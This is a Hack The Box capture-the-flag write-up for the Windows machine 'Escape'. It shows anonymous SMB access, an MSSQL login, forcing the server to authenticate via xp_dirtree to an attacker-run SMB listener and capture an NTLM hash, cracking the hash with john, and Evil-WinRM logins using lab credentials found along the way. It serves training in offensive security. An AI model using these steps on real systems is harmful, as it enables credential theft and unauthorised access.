# HTB Escape (Medium)

Target Info:
- IP: 10.10.11.202
- OS: Windows

Ping Info:
PING 10.10.11.202 (10.10.11.202) 56(84) bytes of data.
64 bytes from 10.10.11.202: icmp_seq=1 ttl=127 time=42.4 ms

Open Port:
```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-06-09 16:24:36Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49687/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack Microsoft Windows RPC
51140/tcp open  msrpc         syn-ack Microsoft Windows RPC
51444/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```


## 139/tcp (netbios-ssn): Null Login

Login with Null and No Pass:
```
root@linux:~# smbclient //10.10.11.202/Public -U "" -N
```

Check list of files:
```
smb: \> dir
```

Download to your local:
```
smb: \> mget "SQL Server Procedures.pdf"
```

You're getting a clue in `SQL Server Procedures.pdf`. `PublicUser` with `10.10.11.202` in MS SQL Service.

## 1433/tcp (ms-sql-s)

Install `impacket-scripts`:
```
sudo apt install impacket-scripts -y
```

Login MS SQL with impacket:
```
sudo impacket-mssqlclient PublicUser:"GuestUserCantWrite1"@10.10.11.202 -p 1433 -debug
```

### Steal NTLM Response through MSSQL xp_dirtree

Create your own local SMB listener server with impacket:
```
sudo impacket-smbserver . . -smb2support
```

Or you can use `metasploit-framework` (msfconsole) to create SMB listener server.
```
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set srvhost <yourhost>
msf6 auxiliary(server/capture/smb) > set johnpwfile /tmp/
msf6 auxiliary(server/capture/smb) > run
```

Then abuse `MS SQL` with `xp_dirtree` query.
```
SQL> xp_dirtree '\\<yoursmblocalserver>\test'
```

Then, you will getting:
```
sql_svc::sequel:aaaaaaaaaaaaaaaa:0b7cb85c234a930248988dfc9d6c59bd:0101000000000000809e0d98ac4ad901ff2faa173808571c00000000010010004a00670079006c004a004e0064006b00030010004a00670079006c004a004e0064006b00020010007700780077006d004300610047007000040010007700780077006d00430061004700700007000800809e0d98ac4ad9010600040002000000080030003000000000000000000000000030000024fa80fc7f23b088cd542907ad48a7ebc58d9c30c768a1a4f66c1ee6118789030a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330034000000000000000000
```

Crack the NTLM Response credential with `john`.
```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt sql_svc.txt
```

## 445/tcp (microsoft-ds?)

Login with RPC Client.
```
rpcclient -U sql_svc --password=REGGIE1234ronnie -p 445 10.10.11.202
```

Enumerate domain users.
```
rpcclient $> enumdomusers
```

## Login Through 5985/tcp (Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)) using Evil-WinRM

```
sudo docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie' -P 5985
```

### PowerShell Commands

Check Windows OS Version
```
PS C:\Users\sql_svc\Documents> [System.Environment]::OSVersion
```

Check Users
```
PS C:\Users\sql_svc\Documents> dir C:\Users
```

Find string recursively in whole files (this command is equivalent `grep -Rn .` in Linux).
```
PS C:\Users\sql_svc\Documents> dir -Recurse C:\ 2> $null | Select-String -pattern "Ryan.Cooper" 2> $null
```

Cat a file.
```
type "C:\SQLServer\Logs\ERRORLOG.BAK"
```
```
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

Then, login with `Ryan.Cooper`.
```
sudo docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -P 5985
```

Find a user.txt flag (this command is equivalent `find .` in Linux).
```
Get-ChildItem -Filter *.txt -Recurse $pwd
```
